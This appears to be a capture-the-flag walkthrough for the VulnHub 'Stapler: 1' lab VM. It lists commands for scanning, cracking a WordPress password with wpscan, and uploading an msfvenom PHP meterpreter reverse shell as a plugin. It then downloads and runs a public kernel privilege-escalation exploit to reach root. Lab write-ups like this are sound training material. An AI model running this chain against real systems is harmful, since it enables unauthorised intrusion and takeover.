									In this article, we will try to attack and gain root access to the Stapler: 1 challenge from VulnHub. The goal is to reconnaissance, enumeration, and exploits this vulnerable machine to get root access and to read the contents of flag.txt. We have been told that are various methods to do so but we have tried and found the simplest way.
Download the stapler VM from here
Penetrating Methodology:

Network Scanning (Nmap, netdiscover)
Enumeration (robot.txt)
WordPress scanning &amp; password cracking (wpscan)
Login into WordPress
Generate PHP Backdoor (Msfvenom)
Upload and execute a backdoor
Reverse connection (Metasploit)
Import python one-liner for proper TTY shell
Kernel privilege escalation
Get Root access and capture the flag.

Start off with scanning the network to find our target. And we all the command for it is:

		
		
			
			
			
			
netdiscover
			
				
					
				
					1
				
						netdiscover
					
				
			
		

We found our target –&gt; 192.168.1.126

To scan our target IP we will use aggressive scan (-A)

		
		
			
			
			
			
nmap -p- -A 192.168.1.126
			
				
					
				
					1
				
						nmap -p- -A 192.168.1.126
					
				
			
		


The result will show us that port number 21, 22, 53, 80, 137, 139, and so many other ports are open.

Also tell us about robot.txt 2 disallowed entries i.e. /admin112233 and /blogblog. Then we explored target IP over port 80 but didn’t found anything here.

So we tried opening it in the browser with port 12380

We open /blogblog/ but here also didn’t find any clue for the next step.

Then we thought to explore https://192.168.1.126:12380/blogblog/ which put up a new web page as shown below. Studying this blog we have established that the blog is made of Word Press. Now obviously use WPScan to know all about the blog. 

To apply wpscan we have come up with a 3-in-1 command as it will tell us all about the theme and plug-ins as well as usernames and the command is:

		
		
			
			
			
			
wpscan -u https://192.168.1.126/blogblog/ --enumerate at --enumerate ap --enumerate u --disable-tls-checks
			
				
					
				
					1
				
						wpscan -u https://192.168.1.126/blogblog/ --enumerate at --enumerate ap --enumerate u --disable-tls-checks
					
				
			
		


It has dumped all username for login, now we only need a password for login into WordPress.

By executing below command you will get a password for John.

		
		
			
			
			
			
wpscan -u https://192.168.1.126/blogblog/ --username John --wordlist /usr/share/wordlists/rockyou.txt
			
				
					
				
					1
				
						wpscan -u https://192.168.1.126/blogblog/ --username John --wordlist /usr/share/wordlists/rockyou.txt
					
				
			
		

As you can see the password is “incorrect” for user “john”; now use these credential for login into WordPress.

As we logged in, all now we have to do is to create our PHP code to upload so that once the code will execute we will have its session. To generate the code type:

		
		
			
			
			
			
msfvenom -p php/meterpreter/reverse_tcp lhost-192.168.1.132 lport=4444 -f raw
			
				
					
				
					1
				
						msfvenom -p php/meterpreter/reverse_tcp lhost-192.168.1.132 lport=4444 -f raw
					
				
			
		

On the other hand run multi/handler inside Metasploit framework.

Copy the code from &lt;?php to die() and save it in a file with .php extension.
Now, as we already logged on, go to plugins option then select add plugin option. Click on browse option and select the PHP in which you have just saved the code and click on OK.

Now go to the upload directory and double click on the shell.php which you just uploaded.

Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.

		
		
			
			
			
			
msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 192.168.1.132
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit
			
				
					
				
					12345
				
						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.132msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
					
				
			
		

From given below image you can observe Meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation. Further type:
sysinfo
Then to access proper TTY shell we had import python one line script by typing following:

		
		
			
			
			
			
shell
python -c 'import pty;pty.spawn("/bin/bash")'
lsb_release -a
			
				
					
				
					123
				
						shellpython -c 'import pty;pty.spawn("/bin/bash")'lsb_release -a
					
				
			
		


We now know that our target is using Ubuntu 16.04 so we will try and search its exploit on exploit-db.com. Our search is successful and we have found our appropriate exploit as shown below:

Now, we need to go into the desired writable file and for that type:

		
		
			
			
			
			
cd /tmp
			
				
					
				
					1
				
						cd /tmp
					
				
			
		

And then to download the exploit type:

		
		
			
			
			
			
wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
			
				
					
				
					1
				
						wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
					
				
			
		


When we download the exploit, zip files are downloaded and now unzip it and for that type:

		
		
			
			
			
			
unzip 39772.zip
			
				
					
				
					1
				
						unzip 39772.zip
					
				
			
		

Open the unzipped file by typing:

		
		
			
			
			
			
ls
cd 39772
			
				
					
				
					12
				
						lscd 39772
					
				
			
		

Now we have a tar file named exploit.tar. Open it with the following command:

		
		
			
			
			
			
tar -xvf exploit.tar
			
				
					
				
					1
				
						tar -xvf exploit.tar
					
				
			
		


Now use the ls command to view the directories. Now we will go into the double put-exploit folder and for that type:

		
		
			
			
			
			
cd ebpf_mapfd_doubleput_exploit
ls 
./compile.sh (will run the compile.sh)
./doubleput (will run the double.sh)
			
				
					
				
					1234
				
						cd ebpf_mapfd_doubleput_exploitls ./compile.sh (will run the compile.sh)./doubleput (will run the double.sh)
					
				
			
		



		
		
			
			
			
			
cd /root
ls
cat flag.txt
			
				
					
				
					123
				
						cd /rootlscat flag.txt
					
				
			
		

Note: This lab can be solved in multiple ways because there is more than one method to hack this lab.
